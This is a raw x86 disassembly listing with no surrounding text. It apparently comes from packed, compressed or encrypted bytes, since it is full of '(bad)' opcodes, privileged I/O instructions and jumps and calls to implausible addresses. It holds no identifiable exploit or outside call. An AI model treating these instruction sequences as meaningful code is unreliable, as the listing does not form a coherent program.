  41306a:	dec    ebp
  41306b:	push   edi
  41306c:	out    0xa5,eax
  41306e:	adc    al,0x58
  413070:	(bad)  
  413071:	outs   dx,BYTE PTR ds:[esi]
  413072:	xchg   DWORD PTR [eax-0xa],esi
  413075:	push   bp
  413077:	jo     0x413039
  413079:	pop    ds
  41307a:	dec    esp
  41307b:	push   edi
  41307c:	(bad)  
  41307d:	pushf  
  41307e:	add    BYTE PTR [esi+0x5f],bl
  413081:	dec    BYTE PTR [esi+0x5a]
  413084:	sahf   
  413085:	cmp    eax,0xfdecf700
  41308a:	mov    ch,0xf8
  41308c:	in     al,0xfd
  41308e:	push   eax
  413090:	jo     0x4130ce
  413092:	inc    DWORD PTR [edi-0x13]
  413095:	inc    ebx
  413096:	clc    
  413097:	and    DWORD PTR [ebp-0x12d80004],ebx
  41309d:	jae    0x41309b
  41309f:	xor    BYTE PTR ds:0x13880029,dl
  4130a5:	ror    DWORD PTR [eax+ebx*2],0x47
  4130a9:	mov    esp,ebp
  4130ab:	fist   DWORD PTR [edi]
  4130ad:	sti    
  4130ae:	push   0x48
  4130b0:	xor    cl,BYTE PTR [ecx-0x1]
  4130b3:	fst    QWORD PTR [ebx-0x1a]
  4130b6:	mov    ebp,0x89fdec13
  4130bb:	or     eax,0x5075fde9
  4130c0:	sbb    DWORD PTR fs:[ecx+0x9],ebp
  4130c4:	or     eax,0x45ae35ff
  4130c9:	aas    
  4130ca:	add    BYTE PTR [eax],al
  4130cc:	mov    cl,0xfb
  4130ce:	jmp    edi
  4130d0:	jmp    0x413145
  4130d2:	or     BYTE PTR [eax+0x58],dh
  4130d5:	addr16 inc ecx
  4130d7:	sbb    BYTE PTR [eax+eax*1+0x0],ah
  4130db:	sbb    BYTE PTR [esi+eiz*8-0x2145a1e],cl
  4130e2:	inc    DWORD PTR [eax]
  4130e4:	sbb    eax,0xe075fde9
  4130e9:	jecxz  0x4130b9
  4130eb:	cmp    esp,DWORD PTR [edi-0x14]
  4130ee:	mov    edx,0x8b550bcc
  4130f4:	push   esp
  4130f5:	nop
  4130f6:	ret    0xe2fc
  4130f9:	or     ebp,DWORD PTR [edx+0x4c]
  4130fc:	xor    al,BYTE PTR ds:0x31e8
  413101:	ss sbb eax,0xc8e8b6ff
  413107:	sti    
  413108:	sbb    DWORD PTR [edx+0x2],esp
  41310b:	out    dx,eax
  41310c:	out    0x39,eax
  41310e:	aam    0x68
  413110:	lock popa 
  413112:	jmp    0x4ff:0x2a1087c
  413119:	pop    edx
  41311a:	push   0x5e
  41311c:	push   cs
  41311d:	mul    DWORD PTR [edx-0x2]
  413120:	add    al,0xfe
  413122:	bound  esi,QWORD PTR [ecx+ebp*1+0xa]
  413126:	jns    0x413162
  413128:	outs   dx,BYTE PTR ds:[esi]
  413129:	push   cs
  41312a:	dec    ebp
  41312b:	shr    DWORD PTR ds:0x4d8ab762,0xe0
  413132:	inc    edi
  413133:	iret   
  413134:	pop    esi
  413135:	popaw  
  413137:	mov    esp,?
  413139:	ins    DWORD PTR es:[edi],dx
  41313a:	mov    dl,0xfe
  41313c:	mov    esp,0x29746165
  413141:	dec    edx
  413142:	das    
  413143:	sub    dh,BYTE PTR [ecx]
  413145:	bound  ecx,QWORD PTR ds:0xe53e00c0
  41314b:	test   DWORD PTR [ecx],0x44496031
  413151:	sbb    DWORD PTR [ecx+0x2],esp
  413154:	add    BYTE PTR [ecx],dh
  413156:	scas   eax,DWORD PTR es:[edi]
  413157:	(bad)  
  413158:	repz push cs
  41315a:	push   0x609b0002
  41315f:	in     al,dx
  413160:	dec    DWORD PTR [eax-0x5a0013a0]
  413166:	sub    eax,0xe5bc4f58
  41316b:	push   esi
  41316c:	mul    dh
  41316e:	xlat   BYTE PTR ds:[ebx]
  41316f:	mov    dl,0xfe
  413171:	fsub   DWORD PTR fs:[ecx+0x74]
  413175:	aad    0x88
  413177:	popa   
  413178:	sub    BYTE PTR [ecx],dh
  41317a:	or     ecx,ebp
  41317c:	push   cs
  41317d:	icebp  
  41317e:	fucom  st(3)
  413180:	ins    BYTE PTR es:[edi],dx
  413181:	out    0x8,al
  413183:	jmp    0xa0bc7a8b
  413188:	les    ebp,FWORD PTR [esi-0x66f044a9]
  41318e:	mov    ecx,0xb99f62a7
  413193:	popa   
  413194:	xor    esp,DWORD PTR [ebp-0x70a5cb74]
  41319a:	push   esi
  41319b:	mov    eax,0xa7c98eb5
  4131a0:	bound  edi,QWORD PTR [edi-0x80]
  4131a3:	imul   edi,DWORD PTR [ebx],0x7f
  4131a6:	push   esi
  4131a7:	or     eax,0x614c46b
  4131ac:	bound  eax,QWORD PTR [eax]
  4131ae:	fmul   DWORD PTR [eax]
  4131b0:	xchg   ecx,eax
  4131b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131b2:	leave  
  4131b3:	(bad)  
  4131b4:	call   0xf572cf1b
  4131b9:	popa   
  4131ba:	dec    edi
  4131bb:	push   esi
  4131bc:	pop    ebx
  4131bd:	or     al,0x59
  4131bf:	jo     0x4131e9
  4131c1:	popa   
  4131c2:	aas    
  4131c3:	sub    BYTE PTR [ebx+0x54],0x3f
  4131c7:	push   esi
  4131c8:	int    0xee
  4131ca:	cs out dx,al
  4131cc:	sub    ebx,0x97be0971
  4131d2:	push   es
  4131d3:	pop    esi
  4131d4:	mov    ch,0x61
  4131d6:	pop    ss
  4131d7:	fsubr  st(0),st
  4131d9:	imul   ecx,DWORD PTR [ecx+ecx*8-0x74469e5b],0xffffff8c
  4131e1:	pop    ecx
  4131e2:	call   DWORD PTR [ebp+0x2]
  4131e5:	add    al,0x89
  4131e7:	cmp    edi,edi
  4131e9:	ret    0x56ee
  4131ec:	cmp    edi,DWORD PTR [edi+ebx*8]
  4131ef:	push   ebp
  4131f0:	jge    0x413253
  4131f2:	add    DWORD PTR gs:[eax],eax
  4131f5:	or     esp,0xba6eff15
  4131fb:	mov    edi,fs
  4131fd:	pop    esi
  4131fe:	push   eax
  4131ff:	push   edi
  413200:	mov    WORD PTR [ecx+esi*2+0x5f],fs
  413204:	(bad)  
  413205:	push   esi
  413206:	jge    0x4131f5
  413208:	call   0xfd96a5cd
  41320d:	jl     0x413274
  41320f:	pop    edi
  413210:	(bad)  
  413211:	add    BYTE PTR ds:[eax],dl
  413214:	fld    QWORD PTR [edi]
  413216:	inc    ecx
  413217:	ins    BYTE PTR es:[edi],dx
  413218:	adc    eax,0x8cba2eff
  41321d:	jecxz  0x41323d
  41321f:	adc    BYTE PTR [edi+0x69],dl
  413222:	jmp    0xa8a985b1
  413227:	xor    dl,BYTE PTR [esi-0x4c]
  41322a:	xor    DWORD PTR [eax],ecx
  41322c:	push   edi
  41322d:	inc    BYTE PTR [esi]
  41322f:	jle    0x41323e
  413231:	call   0xfe97a507
  413236:	pusha  
  413237:	scas   al,BYTE PTR es:[edi]
  413238:	xor    eax,0x84d1eef6
  41323d:	test   BYTE PTR [ecx+0x39fe56e9],bh
  413243:	dec    ebp
  413244:	sti    
  413245:	imul   ebp,DWORD PTR [eax],0xb1b4562d
  41324b:	mov    DWORD PTR [ebx-0x2],edx
  41324e:	(bad)  
  41324f:	dec    DWORD PTR [eax+ebp*8]
  413252:	icebp  
  413253:	repnz push ebx
  413255:	(bad)  
  413256:	pusha  
  413257:	scas   eax,DWORD PTR es:[edi]
  413258:	cmp    dh,dh
  41325a:	scas   al,BYTE PTR es:[edi]
  41325b:	xchg   ecx,eax
  41325c:	xchg   DWORD PTR [ecx+ebx*4-0x1601ac97],edi
  413263:	out    0xdf,al
  413265:	adc    BYTE PTR [esi+eax*4+0x5b],0xfe
  41326a:	mov    ?,WORD PTR [edx]
  41326c:	frstor [ecx+0x0]
  41326f:	pop    ebx
  413270:	jae    0x413258
  413272:	neg    DWORD PTR [edi-0x17]
  413275:	(bad)  
  413276:	jae    0x413278
  413278:	inc    ecx
  413279:	gs (bad) 
  41327b:	dec    DWORD PTR [edi-0x56]
  41327e:	std    
  41327f:	jne    0x413249
  413281:	loopne 0x4132f4
  413283:	cmp    DWORD PTR [edi-0x17],ebx
  413286:	std    
  413287:	mov    ch,0x58
  413289:	mov    cl,0xfd
  41328b:	(bad)  
  41328c:	(bad)  
  41328d:	cmp    cl,BYTE PTR [esi]
  41328f:	call   0x4021eb
  413294:	pop    edi
  413295:	jnp    0x413281
  413297:	neg    DWORD PTR [edi-0x17]
  41329a:	std    
  41329b:	jne    0x413305
  41329d:	loopne 0x413256
  41329f:	cmp    DWORD PTR [edi-0x17],ecx
  4132a2:	std    
  4132a3:	mov    ch,0x20
  4132a5:	mov    cl,0xfd
  4132a7:	call   FWORD PTR [edi]
  4132a9:	cmp    ecx,DWORD PTR [esi]
  4132ab:	call   0x4021a3
  4132b0:	das    
  4132b1:	jnp    0x41328d
  4132b3:	neg    DWORD PTR [edi-0x4c]
  4132b6:	std    
  4132b7:	mov    ch,0x24
  4132b9:	mov    cl,0xfd
  4132bb:	call   FWORD PTR [edi+0x3e]
  4132be:	push   cs
  4132bf:	call   0x4028a7
  4132c4:	pop    edi
  4132c5:	jb     0x4132a5
  4132c7:	neg    DWORD PTR [edi-0x4c]
  4132ca:	std    
  4132cb:	jne    0x4132f5
  4132cd:	loopne 0x413256
  4132cf:	cmp    edi,ebp
  4132d1:	mov    bl,0x81
  4132d3:	mov    ebp,0xfffdbbb8
  4132d8:	or     BYTE PTR [edi+ebx*1],bh
  4132db:	push   0xef081900
  4132e0:	mov    esi,0xe80e31cf
  4132e5:	stc    
  4132e6:	hlt    
  4132e7:	(bad)  
  4132e8:	push   DWORD PTR [ecx]
  4132ea:	jnp    0x413284
  4132ec:	iret   
  4132ed:	out    0x82,al
  4132ef:	pop    esi
  4132f0:	(bad)  
  4132f1:	pushf  
  4132f2:	jne    0x41334a
  4132f4:	(bad)  
  4132f5:	(bad)  
  4132f7:	fmul   DWORD PTR [edi]
  4132f9:	leave  
  4132fa:	mov    ds,WORD PTR [ebx]
  4132fc:	dec    esi
  4132fe:	loop   0x4132d8
  413300:	shufps xmm6,XMMWORD PTR [ebx+edi*1-0xa],0xbe
  413306:	mov    dl,0x5e
  413308:	je     0x413333
  41330a:	retf   0xfe2b
  41330d:	scas   al,BYTE PTR es:[edi]
  41330e:	ret    0xb45e
  413311:	mov    DWORD PTR [edx],edx
  413313:	pop    edi
  413314:	dec    BYTE PTR [ecx-0x6900e1af]
  41331a:	sbb    bl,BYTE PTR [ecx+0x5f2286ef]
  413320:	out    0x4c,eax
  413322:	outs   dx,BYTE PTR ds:[esi]
  413323:	pop    ebp
  413324:	(bad)  
  413325:	jle    0x4132e3
  413327:	outs   dx,DWORD PTR ds:[esi]
  413328:	div    BYTE PTR [esi-0x6]
  41332b:	imul   ebx,DWORD PTR [ecx],0x2d
  41332e:	add    ebx,DWORD PTR [edi-0x2]
  413331:	pushf  
  413332:	stc    
  413333:	push   esi
  413334:	(bad)  
  413335:	pop    esi
  413336:	stc    
  413337:	push   cs
  413338:	cmp    al,0x56
  41333a:	pop    edx
  41333b:	pop    ebp
  41333c:	mov    ah,0x55
  41333e:	pop    edx
  41333f:	pop    ebp
  413340:	inc    BYTE PTR [eax]
  413342:	pop    ecx
  413343:	gs push ds
  413345:	(bad)  
  413346:	xor    dl,BYTE PTR ds:[edi+0x5d3a3edf]
  41334d:	out    0x28,eax
  41334f:	clc    
  413350:	pop    esi
  413351:	(bad)  
  413352:	es (bad) 
  413354:	neg    BYTE PTR ss:[esi]
  413357:	xchg   esp,eax
  413358:	push   0xffffffed
  41335a:	pop    edx
  41335b:	fwait
  41335c:	pop    ebp
  41335d:	(bad)  
  41335e:	je     0x4132f8
  413360:	imul   edi,ecx,0x4
  413363:	or     ah,BYTE PTR [esi-0x632300a2]
  413369:	imul   ebp,DWORD PTR [eax],0x21
  41336c:	jmp    0xdc892b74
  413371:	add    edi,DWORD PTR [esi+edi*2-0x6c]
  413375:	xor    dl,0x55
  413378:	adc    al,BYTE PTR [ebx+ecx*2]
  41337b:	les    esi,FWORD PTR [ebp-0x28]
  41337e:	ss popa 
  413380:	call   0x6f93f9a1
  413385:	enter  0x52ba,0xd3
  413389:	or     ecx,DWORD PTR [ecx-0x7f]
  41338c:	mov    edi,0x1353aec4
  413391:	xchg   esi,eax
  413392:	out    dx,al
  413393:	(bad)  
  413394:	call   0x3d95f304
  413399:	pop    esi
  41339a:	xchg   edi,eax
  41339b:	fsubr  st(0),st
  41339d:	jmp    0x413355
  41339f:	loopne 0x413348
  4133a1:	add    ebx,DWORD PTR [ecx]
  4133a3:	pop    es
  4133a4:	jmp    0x61f233ac
  4133a9:	imul   esp,DWORD PTR [eax+0x77],0x52
  4133ad:	adc    eax,0x93526ad8
  4133b2:	or     ebx,DWORD PTR [ecx-0xa]
  4133b5:	mov    edi,0x2a405f5e
  4133ba:	pop    es
  4133bb:	xor    DWORD PTR [ecx+eiz*2-0x13b24c91],edi
  4133c2:	mov    ah,0xdf
  4133c4:	fsubp  st(0),st
  4133c6:	jmp    0xc9485b7
  4133cb:	dec    ecx
  4133cc:	pushf  
  4133cd:	adc    BYTE PTR [ebp+0x2f],bl
  4133d0:	and    BYTE PTR [ebx],0x60
  4133d3:	mov    ebx,0x71cc031b
  4133d8:	or     DWORD PTR [edx+0x1f],esi
  4133db:	push   edi
  4133dc:	sar    edi,0x27
  4133df:	xor    eax,0xdee93e89
  4133e4:	int3   
  4133e5:	addr16 retf 0xc908
  4133e9:	push   DWORD PTR ds:0xe9263885
  4133ef:	xor    bh,dh
  4133f1:	mov    edi,0xe7bbe415
  4133f6:	iret   
  4133f7:	not    DWORD PTR [edx-0x2]
  4133fa:	sbb    ebp,eax
  4133fc:	push   ecx
  4133fd:	inc    BYTE PTR [esi+0x32be9af]
  413403:	repnz push ecx
  413405:	dec    esi
  413406:	data16 out 0x9,al
  413409:	call   0x530a3429
  41340e:	inc    BYTE PTR [ecx+0x48]
  413411:	push   cs
  413412:	dec    DWORD PTR [esi+0x18]
  413415:	or     DWORD PTR [esi+0x69],eax
  413418:	aas    
  413419:	or     DWORD PTR [ebp+0x43],esi
  41341c:	outs   dx,DWORD PTR ds:[esi]
  41341d:	dec    ebp
  41341e:	xor    ch,BYTE PTR [ecx]
  413420:	stos   BYTE PTR es:[edi],al
  413421:	push   edx
  413422:	(bad)  
  413423:	cs in  al,0x57
  413426:	lods   eax,DWORD PTR ds:[esi]
  413427:	loope  0x41345e
  413429:	fdivr  QWORD PTR [edx-0x1b2a1e2]
  41342f:	pushf  
  413430:	cmp    ah,BYTE PTR [ecx-0x6a]
  413433:	rol    DWORD PTR ds:0xeba75e53,1
  413439:	inc    edi
  41343a:	add    ebp,ecx
  41343c:	lahf   
  41343d:	jle    0x41342a
  41343f:	push   0xfffffff9
  413441:	dec    ebp
  413442:	imul   ebp,ecx,0x5cfec258
  413448:	sub    eax,0xd4213861
  41344d:	push   edx
  41344e:	mov    BYTE PTR [ecx+edx*4],ch
  413451:	loop   0x413452
  413453:	inc    eax
  413454:	jmp    0x3765:0x80040e2
  41345b:	push   0x49
  41345d:	add    eax,0x448e35ff
  413462:	aas    
  413463:	add    al,dh
  413465:	lods   eax,DWORD PTR ds:[esi]
  413466:	cmp    edi,edi
  413468:	xlat   BYTE PTR ds:[ebx]
  413469:	add    eax,eax
  41346b:	je     0x41349e
  41346d:	xchg   ebp,eax
  41346e:	data16 add BYTE PTR [eax],al
  413471:	fcomp  st(5)
  413473:	mov    esp,0x3f633268
  413478:	add    BYTE PTR [eax],bh
  41347a:	scas   al,BYTE PTR es:[edi]
  41347b:	jae    0x413485
  41347d:	ror    bl,0x61
  413480:	inc    DWORD PTR [edi-0x1c]
  413483:	enter  0x573a,0xad
  413487:	data16 add al,cl
  41348a:	fnstsw WORD PTR [eax+ebp*2+0x3f62e2]
  413491:	jo     0x4134fe
  413493:	push   0x73ad9841
  413498:	or     BYTE PTR [eax],al
  41349a:	mov    esp,0xad57ff61
  41349f:	jae    0x41349d
  4134a1:	inc    edi
  4134a2:	aaa    
  4134a3:	push   es
  4134a4:	call   0x4021d7
  4134a9:	inc    ecx
  4134aa:	retf   0x2
  4134ad:	mov    ebp,0x1c83ea81
  4134b2:	mov    al,0x54
  4134b4:	push   edi
  4134b5:	mov    dl,0xc
  4134b7:	push   0x50
  4134b9:	aaa    
  4134ba:	aaa    
  4134bb:	push   es
  4134bc:	call   0x4029e1
  4134c1:	rol    DWORD PTR [esi-0x6],1
  4134c4:	mov    edi,DWORD PTR [ebp-0xe]
  4134c7:	inc    edi
  4134c8:	inc    ecx
  4134c9:	dec    eax
  4134ca:	jg     0x413507
  4134cc:	add    BYTE PTR ds:[esi-0x2],al
  4134d0:	jg     0x413503
  4134d2:	test   DWORD PTR [ebx],0xca6c0074
  4134d8:	fsubr  QWORD PTR [ecx+0x70]
  4134db:	bound  esi,QWORD PTR [ecx+0x4080ce7]
  4134e1:	add    BYTE PTR [edx],bh
  4134e3:	mov    ds:0x4a5f1ecf,al
  4134e8:	sbb    al,0x44
  4134ea:	(bad)  
  4134eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134ec:	mov    bl,0x67
  4134ee:	xor    DWORD PTR [edx+0x69],esp
  4134f1:	mov    ebp,0x40ede359
  4134f6:	xor    DWORD PTR [edx],edx
  4134f8:	pop    ebx
  4134f9:	je     0x413524
  4134fb:	jp     0x4134bd
  4134fd:	(bad)  
  4134fe:	(bad)  
  4134ff:	into   
  413500:	imul   ecx,DWORD PTR [ebp+0xb],0xffffffd7
  413504:	pop    edx
  413505:	jmp    0x2d31:0x3d842830
  41350c:	pop    esp
  41350d:	inc    ebp
  41350e:	mov    ch,0xf2
  413510:	inc    ebx
  413511:	mov    eax,0xfe5ab6ae
  413516:	mov    ds:0x24071bcf,eax
  41351b:	mov    ebx,DWORD PTR [edx+0x74]
  41351e:	xchg   ebp,eax
  41351f:	push   cs
  413520:	rol    DWORD PTR [edi],1
  413522:	cdq    
  413523:	mov    edx,DWORD PTR [edx]
  413525:	inc    DWORD PTR [esi+0x73c8b87e]
  41352b:	pop    ebp
  41352c:	add    dl,BYTE PTR [ebp-0x56]
  41352f:	std    
  413530:	xchg   bl,al
  413532:	ins    DWORD PTR es:[edi],dx
  413533:	(bad)  
  413534:	mov    cl,0x69
  413536:	xor    DWORD PTR [ebx+esi*4+0x59e400fe],ecx
  41353d:	push   0x49
  41353f:	push   ds
  413540:	dec    edi
  413541:	pop    ecx
  413542:	mov    ah,dh
  413544:	push   ebp
  413545:	lea    esi,[ebx+ecx*1]
  413548:	stos   BYTE PTR es:[edi],al
  413549:	ret    
  41354a:	jmp    FWORD PTR [ebx-0x16e5dbf8]
  413550:	leave  
  413551:	call   0x5d4aa4d9
  413556:	ror    DWORD PTR [esi+0x1ec5427e],0xb8
  41355d:	shl    dl,1
  41355f:	dec    esp
  413560:	or     ecx,ebp
  413562:	push   cs
  413563:	icebp  
  413564:	aad    0xd5
  413566:	mov    cl,0xe
  413568:	xchg   ebx,eax
  413569:	sub    DWORD PTR [ebx-0x1],ebx
  41356c:	mov    ecx,0x5e310410
  413571:	pop    esi
  413572:	jmp    0x413505
  413574:	jecxz  0x41359d
  413576:	add    al,0x81
  413578:	dec    esi
  413579:	adc    ecx,DWORD PTR [ecx+ecx*8]
  41357c:	inc    esi
  41357d:	or     bl,BYTE PTR [ebx-0x29]
  413580:	popa   
  413581:	cwde   
  413582:	sbb    al,0xce
  413584:	dec    esi
  413585:	add    DWORD PTR [edi+ebp*2],0x4403ae89
  41358c:	push   ebx
  41358d:	scas   al,BYTE PTR es:[edi]
  41358e:	push   edi
  41358f:	add    ecx,DWORD PTR [ecx-0x61]
  413592:	pop    edx
  413593:	scas   eax,DWORD PTR es:[edi]
  413594:	dec    esi
  413595:	push   ebp
  413596:	push   ebp
  413597:	aam    0x11
  413599:	out    0xd0,al
  41359b:	fisttp DWORD PTR [esi-0x45]
  41359e:	push   edi
  41359f:	add    BYTE PTR [edi+0x5a6bf0d4],dl
  4135a5:	push   ss
  4135a6:	ss pop edx
  4135a8:	out    0xae,eax
  4135aa:	pop    ds
  4135ab:	inc    ebp
  4135ac:	xor    cl,BYTE PTR [ecx]
  4135ae:	mov    esp,0x248a8a8e
  4135b3:	push   edi
  4135b4:	fmul   DWORD PTR [eax]
  4135b6:	xor    DWORD PTR [ebp+0x6be0d467],0x6c
  4135bd:	pop    ss
  4135be:	push   es
  4135bf:	pop    edx
  4135c0:	test   eax,0x9aeafcc4
  4135c5:	jecxz  0x4135c6
  4135c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135c8:	xor    cl,BYTE PTR [esi+0x74]
  4135cb:	loope  0x413597
  4135cd:	mov    ebx,0x4ed8e6df
  4135d2:	je     0x4135b1
  4135d4:	mov    ch,dl
  4135d6:	pop    es
  4135d7:	ror    DWORD PTR [edx+0x6aceff14],0x48
  4135de:	add    ebp,ecx
  4135e0:	mov    DWORD PTR [edx+0x2e716aeb],0x1f6b655
  4135ea:	call   0xfe8f5113
  4135ef:	bnd jb 0x4135c7
  4135f2:	add    al,0x3f
  4135f4:	jp     0x41363e
  4135f6:	pop    es
  4135f7:	jmp    0x3a30faab
  4135fc:	js     0x4135d3
  4135fe:	or     edx,DWORD PTR [ecx+0x7eff0c80]
  413604:	add    BYTE PTR [ecx+ecx*2],bh
  413607:	push   cs
  413608:	ins    DWORD PTR es:[edi],dx
  413609:	xor    eax,0x59e90008
  41360e:	aad    0xfb
  413610:	push   ecx
  413611:	ja     0x413623
  413613:	call   FWORD PTR [esi-0x46]
  413616:	(bad)  
  413617:	jmp    0x41366f
  413619:	jbe    0x41366c
  41361b:	(bad)  
  41361c:	aam    0x16
  41361e:	dec    edi
  41361f:	je     0x413662
  413621:	add    eax,0xe83e38ce
  413626:	xor    BYTE PTR [ebp+eax*2+0x1a],0x9e
  41362b:	(bad)  
  41362c:	call   0x927c1763
  413631:	jae    0x413680
  413633:	push   esp
  413634:	adc    esi,ecx
  413636:	and    al,0x0
  413638:	jmp    0xe4b57f72
  41363d:	retf   
  41363e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41363f:	(bad)  
  413640:	dec    DWORD PTR [eax+0x9]
  413643:	mov    esi,eax
  413645:	mov    al,ds:0x58416aec
  41364a:	loope  0x41362a
  41364c:	and    ecx,DWORD PTR [eax+0x9]
  41364f:	add    esi,eax
  413651:	sar    DWORD PTR [esi],0xe6
  413654:	push   0x3f5e5b
  413659:	data16 fnstsw WORD PTR [esi+0x25]
  41365d:	or     BYTE PTR [ecx],cl
  41365f:	or     eax,eax
  413661:	push   ebp
  413662:	dec    esp
  413663:	out    0x80,eax
  413665:	sbb    BYTE PTR [ecx],cl
  413667:	add    BYTE PTR [edx-0x1351800],cl
  41366d:	call   FWORD PTR [eax]
  41366f:	xchg   ebx,eax
  413670:	std    
  413671:	jne    0x413613
  413673:	loopne 0x41362b
  413675:	and    ebx,eax
  413677:	or     BYTE PTR [ebx],cl
  413679:	rol    BYTE PTR [ebp+eiz*2-0x79],0x45
  41367e:	mov    ah,0xb1
  413680:	jae    0x41366a
  413682:	rcr    cl,0x46
  413685:	dec    DWORD PTR [edi+0x7f]
  413688:	inc    ebx
  413689:	loopne 0x4136ca
  41368b:	cmp    esp,edx
  41368d:	inc    ebp
  41368f:	call   0xb1c2b07a
  413694:	std    
  413695:	or     ebx,DWORD PTR [eax+0x3c]
  413698:	cmp    ecx,edx
  41369a:	ins    DWORD PTR es:[edi],dx
  41369b:	lods   al,BYTE PTR ds:[esi]
  41369c:	push   0xe28afd00
  4136a1:	push   eax
  4136a2:	out    dx,eax
  4136a3:	cmp    bl,dh
  4136a5:	call   0x3e99e7
  4136aa:	xchg   ebx,eax
  4136ab:	enter  0x2672,0x70
  4136af:	pop    es
  4136b0:	add    bh,ch
  4136b2:	push   cs
  4136b3:	mov    cl,0x73
  4136b5:	or     BYTE PTR [eax-0x68],al
  4136b8:	xor    edi,edi
  4136ba:	xor    ebx,esi
  4136bc:	push   edi
  4136bd:	je     0x413708
  4136bf:	sti    
  4136c0:	int    0x7
  4136c2:	dec    ecx
  4136c3:	mov    ebx,0x4b4eff0d
  4136c8:	int3   
  4136c9:	jecxz  0x413711
  4136cb:	int    0x62
  4136cd:	inc    BYTE PTR [eax]
  4136cf:	les    ebp,FWORD PTR [ecx+0x6a]
  4136d2:	ins    BYTE PTR es:[edi],dx
  4136d3:	cld    
  4136d4:	bound  edx,QWORD PTR [esi-0x2]
  4136d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136d8:	inc    edx
  4136d9:	imul   edi,DWORD PTR [ebp+0x69],0x33
  4136dd:	push   esi
  4136de:	pop    ecx
  4136df:	jns    0x4136cb
  4136e1:	repz jg 0x41373b
  4136e4:	bound  eax,QWORD PTR ds:0x568b7685
  4136ea:	(bad)  
  4136eb:	cdq    
  4136ec:	pusha  
  4136ed:	add    ch,bh
  4136ef:	mov    edi,0x907d09a
  4136f4:	dec    ebp
  4136f5:	ud0    ebp,esi
  4136f8:	push   0xffffffd0
  4136fa:	sti    
  4136fb:	out    0xec,al
  4136fd:	addr16 (bad) 
  4136ff:	fs push 0x6a
  413702:	cmp    al,0x1c
  413704:	adc    DWORD PTR [esi-0x2],0x44
  413708:	jle    0x413775
  41370a:	dec    ebp
  41370b:	or     ebx,edx
  41370d:	push   esi
  41370e:	mov    WORD PTR [edx+edx*8-0x4d],?
  413712:	out    0x34,eax
  413714:	and    al,0x57
  413716:	(bad)  
  413717:	call   0x269:0x73c8b461
  41371e:	push   ebp
  41371f:	stos   BYTE PTR es:[edi],al
  413720:	or     eax,0xd48dc383
  413725:	sar    bl,0xe1
  413728:	or     dl,cl
  41372a:	or     eax,DWORD PTR [esi-0x2517f574]
  413730:	add    eax,0x2a000004
  413735:	or     DWORD PTR [ecx],ebp
  413737:	pop    es
  413738:	mov    ah,0x20
  41373a:	call   0xe9206842
  41373f:	jmp    0x413788
  413741:	loopne 0x4136ea
  413743:	add    edx,DWORD PTR [esi-0x2b]
  413746:	hlt    
  413747:	push   esi
  413748:	lds    eax,FWORD PTR [eax]
  41374a:	adc    DWORD PTR [edi],ebx
  41374c:	or     cl,BYTE PTR [ebp+esi*8-0x74]
  413750:	cmc    
  413751:	push   eax
  413752:	add    BYTE PTR [ebx],0xc9
  413755:	in     al,dx
  413756:	push   ecx
  413757:	lds    ebp,FWORD PTR [esi]
  413759:	dec    esp
  41375a:	push   ebx
  41375b:	or     BYTE PTR [esi],ah
  41375d:	aad    0xe0
  41375f:	imul   eax,DWORD PTR [eax+0xe],0xffffffce
  413763:	push   esi
  413764:	test   eax,0x7588bcc4
  413769:	gs sbb ah,ch
  41376c:	push   ebx
  41376d:	fisub  WORD PTR [edi]
  41376f:	add    al,0xfe
  413771:	aam    0xdc
  413773:	push   esi
  413774:	jge    0x413777
  413776:	xchg   ecx,eax
  413777:	pop    edx
  413778:	sub    BYTE PTR [edx-0x63],cl
  41377b:	mov    WORD PTR [ebp+0x59],gs
  41377e:	add    al,BYTE PTR [ecx+ecx*2]
  413781:	pop    ds
  413782:	add    al,ch
  413784:	(bad)  
  413785:	dec    ebx
  413786:	sti    
  413787:	pop    es
  413788:	into   
  413789:	aam    0xf0
  41378b:	imul   ecx,esp,0xf
  41378e:	jbe    0x4137e6
  413790:	test   eax,0xb6e97cc4
  413795:	loop   0x4137ac
  413797:	jmp    0x413799
  413799:	icebp  
  41379a:	or     BYTE PTR [esi-0x30],bl
  41379d:	cmp    cl,BYTE PTR [edx-0x25]
  4137a0:	or     ecx,DWORD PTR [ecx-0x68a8edc8]
  4137a6:	sub    BYTE PTR [ebx+0x38ccb36b],0x3
  4137ad:	ss test edi,edi
  4137b0:	imul   esi,DWORD PTR [edx],0x596a0009
  4137b6:	call   DWORD PTR [ecx+ecx*4-0xfa8bb5]
  4137be:	aam    0xef
  4137c0:	add    DWORD PTR [edi-0x3e],esi
  4137c3:	dec    BYTE PTR [esi]
  4137c5:	sub    ecx,DWORD PTR [ecx+0x73]
  4137c8:	xchg   edi,eax
  4137c9:	add    eax,0x3293e3dd
  4137ce:	jl     0x413814
  4137d0:	or     eax,0xf9744b82
  4137d5:	retf   
  4137d6:	push   es
  4137d7:	popa   
  4137d8:	out    0x84,al
  4137da:	(bad)  
  4137db:	mov    edi,0x7c86ea55
  4137e0:	shl    DWORD PTR ds:0xfe6a52d5,1
  4137e6:	push   ebp
  4137e7:	(bad)  
  4137e8:	cmp    al,0xf6
  4137ea:	xchg   BYTE PTR [ecx+edi*4+0x2d],bh
  4137ee:	aad    0x46
  4137f0:	inc    ecx
  4137f1:	xor    eax,0x5c6fef09
  4137f6:	aad    0xf
  4137f8:	xchg   ecx,eax
  4137f9:	loope  0x413810
  4137fb:	call   FWORD PTR [esi-0x82a8400]
  413801:	xchg   esi,eax
  413802:	out    dx,al
  413803:	stc    
  413804:	out    0x2,eax
  413806:	inc    ecx
  413807:	dec    edx
  413808:	inc    BYTE PTR [esi-0xb01aa02]
  41380e:	ret    0x5f61
  413811:	mov    ebp,0xf4fe4b65
  413816:	push   esi
  413817:	dec    ebx
  413818:	je     0x413873
  41381a:	add    al,0xd5
  41381c:	sqrtps xmm0,XMMWORD PTR [edi+0x15]
  413820:	call   DWORD PTR [esi+0x4]
  413823:	aad    0xeb
  413825:	dec    esi
  413826:	data16 stc 
  413828:	out    0x0,eax
  41382a:	(bad)  
  41382c:	(bad)  
  41382d:	inc    DWORD PTR [edi+0x3a]
  413830:	out    0xff,al
  413832:	mov    ebp,0x7c3ce655
  413837:	mov    ah,0xfd
  413839:	dec    ebp
  41383b:	lods   eax,DWORD PTR ds:[esi]
  41383c:	out    0x21,al
  41383e:	jg     0x4137f4
  413840:	std    
